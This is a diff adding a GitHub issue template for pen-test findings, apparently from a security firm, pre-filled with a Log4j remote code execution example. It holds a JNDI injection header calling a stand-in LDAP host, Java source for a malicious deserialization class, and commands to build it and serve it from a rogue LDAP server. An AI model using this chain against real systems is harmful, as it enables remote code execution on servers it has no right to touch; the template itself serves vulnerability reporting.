@@ -1,0 +1,86 @@
+---
+name: USE THIS ONE -> Secure3 Pen Test Finding Submission
+about: Issue template submitting Pen Test findings
+title: Change this subject - IP/URL `User-Agent` exist Log4j remote code execution (CVE-2021-44228)
+labels: ''
+assignees: tedsecure3
+
+---
+
+### description:
+A Log4j Remote Code Execution (RCE) vulnerability is dicovered in the IP/hostname/URL `User-Agent` parameters during the penetration testing process. 
+This vulnerability is caused by the Log4j library processing certain log messages containing malicious JNDI references, which may allow attackers to execute arbitrary code on the target system. 
+
+Attackers can trigger this vulnerability by sending maliciously crafted requests (such as HTTP request headers containing malicious JNDI references).
+
+More details about CVE-2021-44228 please refer to https://www.cve.org/CVERecord?id=CVE-2021-44228
+
+### exploit process:
+```makefile
+GET /vuln HTTP/1.1
+Host: target.example.com
+User-Agent: ${jndi:ldap://example.com:1389/exec}
+Accept: */*
+```
+```java
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+
+public class EvilObject implements Serializable {
+    private static final long serialVersionUID = 1L;
+
+    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+        in.defaultReadObject();
+        executeCommand();
+    }
+
+    private void executeCommand() {
+        try {
+            String command = "whoami";
+            Runtime.getRuntime().exec(command);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+execute:
+```shell
+javac EvilObject.java
+git clone https://github.com/c0rni3sm/ldap-reflection.git
+cd ldap-reflection
+mvn clean install
+mv EvilObject.java target/classes
+cd target/classes
+jar cf evil-object.jar EvilObject.class
+```
+edit `config.yml`:
+```yaml
+server:
+port: 1389
+object: "exec"
+object_file: "target/classes/evil-object.jar"
+```
+run the LDAP server:
+```shell
+java -jar target/ldap-reflection-1.0.0-SNAPSHOT.jar server config.yml
+```
+A success exploitation screenshot:
+
+the image here
+
+### recommendation:
+1.Update to the latest patched version of Log4j (2.15.0 or higher).
+
+2.Disable the JNDI lookup functionality in Log4j or implement custom log filters to block the processing of malicious log messages.
+
+### locations:
+- IP/Hostname/URL example1
+- IP/Hostname/URL example2 
+
+### severity:
+Informational / Low / Medium / Critical (Choose one only)
+
+### category:
+SQL Injection / Remote Code Execution / Access Control / File Inclusion Vulnerability / File Upload Vulnerability / Cross-Site Scripting / Cross-Site Request Forgery / Component Vulnerabilities / Session Management / Information Leakage / Race Condition Vulnerabilities / Logic Vulnerabilities (Choose one only) 
